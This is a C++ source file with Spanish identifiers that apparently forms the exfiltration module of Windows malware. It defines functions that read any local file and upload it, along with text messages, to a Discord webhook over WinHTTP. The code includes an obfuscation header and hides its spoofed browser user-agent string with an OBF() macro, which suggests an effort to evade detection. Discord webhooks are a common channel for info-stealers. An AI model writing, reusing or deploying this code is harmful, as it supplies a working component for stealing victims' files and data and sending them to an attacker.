#include "discord.h"
#include "obfuscate.h"
#include <winhttp.h>
#include <sstream>
#include <fstream>
#include <vector>

#pragma comment(lib, "winhttp.lib")

std::wstring Utf8ToWide(const std::string& str) {
    if (str.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring result(size - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &result[0], size);
    return result;
}

std::string WideToUtf8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string result(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], size, NULL, NULL);
    return result;
}

static std::string EscaparJSON(const std::string& s) {
    std::stringstream ss;
    for (char c : s) {
        switch (c) {
            case '"':  ss << "\\\""; break;
            case '\\': ss << "\\\\"; break;
            case '\n': ss << "\\n";  break;
            case '\r': ss << "\\r";  break;
            case '\t': ss << "\\t";  break;
            default:   ss << c;      break;
        }
    }
    return ss.str();
}

bool DiscordEnviarTexto(const std::wstring& webhook_url, const std::wstring& mensaje) {
    std::string body = "{\"content\":\"" + EscaparJSON(WideToUtf8(mensaje)) + "\"}";

    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength  = (DWORD)-1;
    urlComp.dwSchemeLength   = (DWORD)-1;
    if (!WinHttpCrackUrl(webhook_url.c_str(), 0, 0, &urlComp)) return false;

    std::wstring host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    HINTERNET hSession = WinHttpOpen(Utf8ToWide(OBF("Mozilla/5.0")).c_str(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(),
        urlComp.nPort ? urlComp.nPort : INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    const wchar_t* headers = L"Content-Type: application/json\r\n";
    BOOL bResult = WinHttpSendRequest(hRequest, headers, -1L,
        (LPVOID)body.c_str(), (DWORD)body.length(),
        (DWORD)body.length(), 0);

    if (bResult) WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return bResult != FALSE;
}

bool DiscordEnviarArchivo(const std::wstring& webhook_url,
                          const std::wstring& ruta_archivo,
                          const std::wstring& comentario) {
    std::string ruta_utf8 = WideToUtf8(ruta_archivo);
    std::ifstream file(ruta_utf8.c_str(), std::ios::binary);
    if (!file) return false;
    std::vector<char> datos((std::istreambuf_iterator<char>(file)),
                             std::istreambuf_iterator<char>());
    file.close();

    std::wstring nombre_w = ruta_archivo.substr(ruta_archivo.find_last_of(L"\\") + 1);
    std::string  nombre   = WideToUtf8(nombre_w);

    std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";

    std::stringstream body;
    body << "--" << boundary << "\r\n";
    body << "Content-Disposition: form-data; name=\"content\"\r\n\r\n";
    body << WideToUtf8(comentario) << "\r\n";
    body << "--" << boundary << "\r\n";
    body << "Content-Disposition: form-data; name=\"file\"; filename=\"" << nombre << "\"\r\n";
    body << "Content-Type: application/octet-stream\r\n\r\n";

    std::string cabecera = body.str();
    std::string cola     = "\r\n--" + boundary + "--\r\n";

    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength  = (DWORD)-1;
    urlComp.dwSchemeLength   = (DWORD)-1;
    if (!WinHttpCrackUrl(webhook_url.c_str(), 0, 0, &urlComp)) return false;

    std::wstring host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    HINTERNET hSession = WinHttpOpen(Utf8ToWide(OBF("Mozilla/5.0")).c_str(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(),
        urlComp.nPort ? urlComp.nPort : INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = L"Content-Type: multipart/form-data; boundary=";
    headers += Utf8ToWide(boundary);
    headers += L"\r\n";

    DWORD total_size = (DWORD)(cabecera.size() + datos.size() + cola.size());

    BOOL bResult = WinHttpSendRequest(hRequest, headers.c_str(), -1L,
        WINHTTP_NO_REQUEST_DATA, 0, total_size, 0);

    if (bResult) {
        DWORD written = 0;
        WinHttpWriteData(hRequest, cabecera.c_str(), (DWORD)cabecera.size(), &written);
        WinHttpWriteData(hRequest, datos.data(), (DWORD)datos.size(), &written);
        WinHttpWriteData(hRequest, cola.c_str(), (DWORD)cola.size(), &written);
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return bResult != FALSE;
}